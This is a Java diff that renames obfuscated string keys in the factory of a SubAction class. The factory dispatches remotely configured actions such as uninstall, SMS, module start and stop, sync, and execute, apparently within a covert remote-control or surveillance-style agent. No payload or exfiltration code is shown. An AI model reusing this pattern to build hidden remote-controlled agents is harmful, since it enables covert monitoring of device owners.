@@ -49,7 +49,7 @@ public abstract class SubAction {
 		this.status = Status.self();
 		this.conf = conf;
 
-		stop = conf.getBoolean(Messages.getString("S.15"), false); //$NON-NLS-1$        
+		stop = conf.getBoolean(Messages.getString("S_15"), false); //$NON-NLS-1$        
 
 		parse(conf);
 	}
@@ -72,27 +72,27 @@ public abstract class SubAction {
 			Check.asserts(type != null, "factory: null type"); //$NON-NLS-1$
 
 		// TODO: messages file
-		if (type.equals(Messages.getString("S.1"))) { //$NON-NLS-1$
+		if (type.equals(Messages.getString("S_1"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_UNINSTALL ***");//$NON-NLS-1$
 			}
 			
 			return new UninstallAction(params);
-		} else if (type.equals(Messages.getString("S.2"))) { //$NON-NLS-1$
+		} else if (type.equals(Messages.getString("S_2"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_SMS ***");//$NON-NLS-1$
 			}
 			
 			return new SmsAction(params);
-		} else if (type.equals(Messages.getString("S.3"))) { //$NON-NLS-1$
-			String status = params.getString(Messages.getString("S.4")); //$NON-NLS-1$
-			if (status.equals(Messages.getString("S.5"))) { //$NON-NLS-1$
+		} else if (type.equals(Messages.getString("S_3"))) { //$NON-NLS-1$
+			String status = params.getString(Messages.getString("S_4")); //$NON-NLS-1$
+			if (status.equals(Messages.getString("S_5"))) { //$NON-NLS-1$
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_START_AGENT ***");//$NON-NLS-1$
 				}
 				
 				return new StartModuleAction(params);
-			} else if (status.equals(Messages.getString("S.6"))) { //$NON-NLS-1$
+			} else if (status.equals(Messages.getString("S_6"))) { //$NON-NLS-1$
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_STOP_AGENT ***");//$NON-NLS-1$
@@ -100,15 +100,15 @@ public abstract class SubAction {
 				
 				return new StopModuleAction(params);
 			}
-		} else if (type.equals(Messages.getString("S.7"))) { //$NON-NLS-1$
-			String status = params.getString(Messages.getString("S.8")); //$NON-NLS-1$
-			if (status.equals(Messages.getString("S.9"))) { //$NON-NLS-1$
+		} else if (type.equals(Messages.getString("S_7"))) { //$NON-NLS-1$
+			String status = params.getString(Messages.getString("S_8")); //$NON-NLS-1$
+			if (status.equals(Messages.getString("S_9"))) { //$NON-NLS-1$
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_ENABLE_EVENT ***");//$NON-NLS-1$
 				}
 				
 				return new EnableEventAction(params);
-			} else if (status.equals(Messages.getString("S.10"))) { //$NON-NLS-1$
+			} else if (status.equals(Messages.getString("S_10"))) { //$NON-NLS-1$
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_DISABLE_EVENT ***");//$NON-NLS-1$
 				}
@@ -116,8 +116,8 @@ public abstract class SubAction {
 				return new DisableEventAction(params);
 
 			}
-		} else if (type.equals(Messages.getString("S.11"))) { //$NON-NLS-1$
-			boolean apn = params.has(Messages.getString("S.12")); //$NON-NLS-1$
+		} else if (type.equals(Messages.getString("S_11"))) { //$NON-NLS-1$
+			boolean apn = params.has(Messages.getString("S_12")); //$NON-NLS-1$
 			
 			if (apn) {
 				if (Cfg.DEBUG) {
@@ -133,14 +133,14 @@ public abstract class SubAction {
 				return new SyncActionInternet(params);
 			}
 
-		} else if (type.equals(Messages.getString("S.13"))) { //$NON-NLS-1$
+		} else if (type.equals(Messages.getString("S_13"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_EXECUTE ***");//$NON-NLS-1$
 			}
 			
 			return new ExecuteAction(params);
 
-		} else if (type.equals(Messages.getString("S.14"))) { //$NON-NLS-1$
+		} else if (type.equals(Messages.getString("S_14"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_INFO ***");//$NON-NLS-1$
 			}
